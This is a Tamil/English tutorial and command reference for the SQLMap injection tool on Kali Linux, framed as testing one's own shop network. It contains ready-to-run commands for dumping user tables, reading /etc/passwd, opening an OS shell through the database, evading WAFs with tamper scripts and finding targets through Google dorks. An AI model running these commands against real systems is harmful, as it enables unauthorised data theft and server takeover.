# Kali Linux Inbuilt Package #9: SQLMap (`sqlmap`) Technical Reference & Setup Guide

---

## 1. Deep Technical Introduction & Architecture (ஆழ்ந்த தொழில்நுட்ப அறிமுகம்)

**SQLMap** என்பது Kali Linux-ல் இயல்பாகவே (Inbuilt) வரும் உலகின் மிக சக்திவாய்ந்த **Automated SQL Injection & Database Takeover Tool** ஆகும். இணைய பயன்பாடுகளில் (Web Applications) உள்ள SQL Injection பலவீனங்களைக் கண்டறிந்து, அவற்றின் மூலமாக பின்புலத்தில் இயங்கும் தரவுத்தளங்களை (Databases) அனலைஸ் செய்யவும், தரவுகளைத் திருடவும் மற்றும் பாதுகாப்பை உறுதிசெய்யவும் இது பயன்படுகிறது.

### ஆழமான தொழில்நுட்பக் கூறுகள் (Core Architecture & Mechanics):

* **SQL Injection Detection Engine:**
  * ஆறு வகையான SQL Injection நுட்பங்களைத் தானாகவே கண்டறியும் திறன் கொண்டது:
    1. **Boolean-based Blind:** SQL வினவலின் True/False பதில்களை வைத்து தரவுகளைப் பிரித்தெடுத்தல்.
    2. **Time-based Blind:** SQL வினவலில் தாமதத்தை (`WAITFOR DELAY` / `SLEEP()`) ஏற்படுத்தித் தரவுகளைப் பெறுதல்.
    3. **Error-based:** சர்வர் வெளியிடும் SQL பிழைச் செய்திகளிலிருந்து (Error Messages) தரவுகளைப் பிரித்தல்.
    4. **UNION Query-based:** `UNION` ஆபரேட்டர் மூலம் கூடுதல் SQL வினவல்களை இணைத்து ஒரே நேரத்தில் தரவுகளைப் பெறுதல்.
    5. **Stacked Queries:** ஒரே நேரத்தில் பல SQL கட்டளைகளைச் செலுத்துதல்.
    6. **Inline Queries:** மூல வினவலுக்குள் துணை வினவல்களைச் (Sub-queries) செலுத்துதல்.

* **Database Fingerprinting Subsystem:**
  * இலக்கு சிஸ்டத்தில் இயங்கும் Database Management System (MySQL, PostgreSQL, Oracle, Microsoft SQL Server, SQLite, MariaDB) எது என்பதைத் துல்லியமாகக் கண்டறியும்.

* **Tamper Scripts Engine:**
  * WAF (Web Application Firewall) மற்றும் IDS/IPS பாதுகாப்பு அமைப்புகளைத் தட்டப்பரிசீலனை செய்ய, அனுப்பப்படும் SQL கட்டளைகளை உருமாற்றும் (Obfuscation) 60-க்கும் மேற்பட்ட Python Tamper Scripts-ஐக் கொண்டுள்ளது.

* **OS Takeover & File System Access:**
  * போதுமான அனுமதிகள் (DBA Privileges) இருக்கும் பட்சத்தில், தரவுத்தளத்தின் வழியே சர்வரின் File System-ஐப் படிக்கவும் (`--file-read`), புதிய கோப்புகளை எழுதவும் (`--file-write`), மற்றும் Command Shell-ஐத் உருவாக்கவும் (`--os-shell`) இது வழிவகுக்கும்.

* **Infrastructure Use Case (உங்கள் லேப் / கடையின் நெட்வொர்க் சோதனைக்கு):**
  * உங்கள் கேமிங் சென்டர் லோக்கல் நெட்வொர்க்கில் இயங்கும் பில்லிங் வெப் அப்ளிகேஷன், வாடிக்கையாளர் போர்ட்டல்கள் அல்லது உள்நாட்டு வெப் சர்வர்களில் SQL Injection பலவீனங்கள் உள்ளனவா என்பதைச் சோதித்து சரிசெய்ய இது பயன்படுகிறது.

---

## 2. Package Setup & Execution Guide (நிறுவும் மற்றும் அமைக்கும் முறை)

SQLMap Python அடிப்படையில் இயங்கும் ஒரு டூல் ஆகும். Kali Linux-ல் இது இயல்பாகவே சேர்க்கப்பட்டுள்ளது.

**SQLMap இன்ஸ்டால் செய்யப்பட்டுள்ளதைச் சரிபார்க்க:**
sqlmap --version


SQLMap டூலை அட்வான்ஸ்டு பதிப்பிற்கு புதுப்பிக்க:
sudo sqlmap --update

உதவி மற்றும் அனைத்து அமைப்புகளின் பட்டியலைப் பார்க்க:
sqlmap -hh

# 3. Categorized Command Reference & Syntax (முக்கியமான கட்டளைகள் மற்றும் விளக்கங்கள்)
SQLMap கட்டளையின் அடிப்படை வடிவம்: sqlmap -u [Target_URL] [Options]

# A. Target Specification Options (இலக்கை நிர்ணயம் செய்தல்)
குறிப்பிட்ட GET Parameter கொண்ட URL-ஐ சோதிக்க (-u):
sqlmap -u "http://example.com/page.php?id=1"

Burp Suite மூலம் பிடிக்கப்பட்ட HTTP Request கோப்பைப் பயன்படுத்தி சோதிக்க (-r):
sqlmap -r request.txt

Google Dork தேடல் முடிவுகளிலிருந்து URL-களைத் தானாக எடுத்துச் சோதிக்க (-g):
sqlmap -g "inurl:page.php?id="

# B. Detection & Enumeration Commands (தரவுத்தள தகவல்களைச் சேகரித்தல்)
இலக்கு சர்வரில் உள்ள அனைத்து டேட்டாபேஸ்களின் பெயர்களைப் பெற (--dbs):
sqlmap -u "http://example.com/page.php?id=1" --dbs

தற்போது பயன்பாட்டில் உள்ள டேட்டாபேஸின் பெயரைப் பெற (--current-db):
sqlmap -u "http://example.com/page.php?id=1" --current-db

குறிப்பிட்ட டேட்டாபேஸில் உள்ள அட்டவணைகளைப் (Tables) பட்டியலிட (--tables):
sqlmap -u "http://example.com/page.php?id=1" -D target_db --tables

குறிப்பிட்ட அட்டவணையில் உள்ள பத்திகளைப் (Columns) பட்டியலிட (--columns):
sqlmap -u "http://example.com/page.php?id=1" -D target_db -T users --columns

அட்டவணையில் உள்ள அனைத்துத் தரவுகளையும் பிரித்தெடுத்துச் சேமிக்க (--dump):
sqlmap -u "http://example.com/page.php?id=1" -D target_db -T users --dump

# C. Optimization & Performance Tuning (வேகக் கட்டுப்பாடு)
ஒரே நேரத்தில் பல Threads மூலம் சோதனையை வேகப்படுத்த (--threads):
sqlmap -u "http://example.com/page.php?id=1" --dbs --threads=5

சோதனையின் ஆழம் மற்றும் அபாய அளவை அதிகரிக்க (--level & --risk):
sqlmap -u "http://example.com/page.php?id=1" --level=5 --risk=3 --dbs

தேவைப்படும் குறிப்பிட்ட SQL Injection நுட்பத்தை மட்டும் பயன்படுத்த (--technique):
sqlmap -u "http://example.com/page.php?id=1" --technique=U --dbs

# D. Authentication & Session Management (உள்நுழைவு மற்றும் குக்கீகள்)
Session Cookie-ஐப் பயன்படுத்தி பாதுகாக்கப்பட்ட பக்கங்களைச் சோதிக்க (--cookie):
sqlmap -u "http://example.com/admin.php?id=1" --cookie="PHPSESSID=abc123xyz"

HTTP POST Form வழியே செல்லும் தரவுகளைச் சோதிக்க (--data):
sqlmap -u "http://example.com/login.php" --data="username=admin&password=123"

சீரற்ற User-Agent தலைப்புகளைப் பயன்படுத்தி சோதிக்க (--random-agent):
sqlmap -u "http://example.com/page.php?id=1" --random-agent --dbs

# E. WAF Evasion & Tamper Scripts (பாதுகாப்பு அடுக்கைத் தாண்டுதல்)
WAF / IDS பாதுகாப்பைத் தவிர்க்க Tamper Scripts-ஐப் பயன்படுத்த (--tamper):
sqlmap -u "http://example.com/page.php?id=1" --tamper=space2comment,between

இலக்கு இணையதளத்தில் WAF உள்ளதா எனச் சோதிக்க (--check-waf):
sqlmap -u "http://example.com/page.php?id=1" --check-waf

# F. File System Access & OS Takeover (கோப்பு மற்றும் சிஸ்டம் நிர்வாகம்)
சர்வரில் உள்ள குறிப்பிட்ட கோப்பை வாசித்துத் திரையில் காட்ட (--file-read):
sqlmap -u "http://example.com/page.php?id=1" --file-read="/etc/passwd"

இலக்கு சர்வரில் நேரடியாக Command Prompt / Terminal பெற (--os-shell):
sqlmap -u "http://example.com/page.php?id=1" --os-shell